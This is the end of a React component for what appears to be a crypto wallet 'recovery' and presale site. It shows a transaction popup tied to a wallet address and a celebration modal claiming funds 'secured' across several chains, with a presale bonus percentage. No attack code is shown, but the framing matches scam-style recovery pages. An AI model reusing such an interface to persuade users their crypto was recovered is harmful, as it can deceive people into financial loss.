          tx={currentPopupTx}
          onClose={() => setShowPopup(false)}
          onDownloadReport={handleDownloadReport}
          translations={translations}
          walletAddress={address}
          recoveryAmount={currentPopupTx.recoveryAmount}
          chains={[currentPopupTx.chain]}
          chainDetails={currentPopupTx.chainDetails}
        />
      )}

      {/* Celebration Modal */}
      {showCelebration && (
        <div className="fixed inset-0 bg-black/90 backdrop-blur-xl flex items-center justify-center z-50 p-4 animate-fadeIn">
          <div className="relative max-w-lg w-full">
            <div className="absolute inset-0 bg-gradient-to-r from-blue-600/30 via-blue-500/30 to-blue-600/30 rounded-3xl blur-2xl animate-pulse-slow"></div>
            
            {[...Array(20)].map((_, i) => (
              <div
                key={i}
                className="absolute w-0.5 h-0.5 bg-gradient-to-r from-blue-400 to-blue-500 rounded-full animate-confetti-cannon"
                style={{
                  left: `${Math.random() * 100}%`,
                  top: '50%',
                  animationDelay: `${i * 0.1}s`,
                  animationDuration: `${1 + Math.random()}s`
                }}
              />
            ))}
            
            <div className="relative bg-gradient-to-br from-gray-900 to-black rounded-3xl p-10 border border-blue-500/20 shadow-2xl text-center">
              <div className="relative mb-6">
                <div className="text-7xl animate-bounce">🎉</div>
              </div>
              
              <h2 className="text-4xl font-black mb-3 bg-gradient-to-r from-blue-400 to-blue-300 bg-clip-text text-transparent">
                {translations.successful}
              </h2>
              
              <p className="text-xl text-gray-300 mb-3">{translations.youHaveSecured}</p>
              
              <div className="text-5xl font-black text-blue-400 mb-3 animate-pulse">
                ${liveTransactions[0]?.recoveryAmount?.toLocaleString() || '0'} USD
              </div>
              
              <div className="inline-block bg-gradient-to-r from-blue-500/20 to-blue-600/20 px-6 py-3 rounded-full mb-4 border border-blue-500/30">
                <span className="text-2xl text-blue-400">+{presaleStats.currentBonus}% BONUS</span>
              </div>
              
              <p className="text-xs text-gray-500 mb-6">
                ✓ Recovered on {verifiedChains.length} chains
              </p>
              
              <button
                onClick={() => setShowCelebration(false)}
                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105"
              >
                {translations.viewButton}
              </button>
            </div>
          </div>
        </div>
      )}

      <style>{`
        @keyframes glow-blue {
          from { filter: drop-shadow(0 0 10px #3b82f6); }
          to { filter: drop-shadow(0 0 40px #60a5fa); }
        }
        @keyframes pulse-blue {
          0% { box-shadow: 0 0 0 0 rgba(59,130,246,.7); }
          70% { box-shadow: 0 0 0 15px rgba(59,130,246,0); }
          100% { box-shadow: 0 0 0 0 rgba(59,130,246,0); }
        }
        @keyframes blink {
          0% { opacity: 1; }
          50% { opacity: 0.4; }
          100% { opacity: 1; }
        }
        @keyframes confetti-cannon {
          0% { transform: translateY(0) rotate(0deg); opacity: 0.8; }
          100% { transform: translateY(-250px) rotate(720deg) translateX(200px); opacity: 0; }
        }
        @keyframes fadeIn {
          from { opacity: 0; transform: scale(0.95); }
          to { opacity: 1; transform: scale(1); }
        }
        @keyframes pulse-slow {
          0%, 100% { opacity: 0.3; }
          50% { opacity: 0.6; }
        }
        @keyframes slideInUp {
          from { transform: translateY(100px); opacity: 0; }
          to { transform: translateY(0); opacity: 1; }
        }
        @keyframes bounce-hand {
          0%, 100% { transform: translateY(-50%) rotate(-15deg); }
          50% { transform: translateY(-60%) rotate(-10deg) scale(1.1); }
        }
        @keyframes ping-slow {
          0% { transform: scale(1); opacity: 1; }
          100% { transform: scale(1.05); opacity: 0; }
        }
        @keyframes pulse-border {
          0% { border-color: rgba(96, 165, 250, 0.3); }
          50% { border-color: rgba(96, 165, 250, 0.8); }
          100% { border-color: rgba(96, 165, 250, 0.3); }
        }
        
        .animate-glow-blue { animation: glow-blue 3s infinite alternate; }
        .animate-pulse-blue { animation: pulse-blue 1.5s infinite; }
        .animate-pulse-glow { animation: blink 1.2s infinite; }
        .animate-confetti-cannon { animation: confetti-cannon 2s ease-out forwards; }
        .animate-fadeIn { animation: fadeIn 0.3s ease-out; }
        .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
        .animate-slideInUp { animation: slideInUp 0.3s ease-out; }
        .animate-bounce-hand { animation: bounce-hand 1.5s ease-in-out infinite; }
        .animate-ping-slow { animation: ping-slow 1.5s ease-out infinite; }
        .animate-pulse-border { animation: pulse-border 2s ease-in-out infinite; }
        
        .custom-scrollbar::-webkit-scrollbar {
          width: 4px;
        }
        .custom-scrollbar::-webkit-scrollbar-track {
          background: rgba(59,130,246,0.1);
          border-radius: 4px;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb {
          background: rgba(59,130,246,0.4);
          border-radius: 4px;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
          background: rgba(59,130,246,0.6);
        }
        
        @media (max-width: 768px) {
          .fixed.bottom-6.right-6 {
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5);
          }
        }
      `}</style>
    </div>
  );
}

export default App;
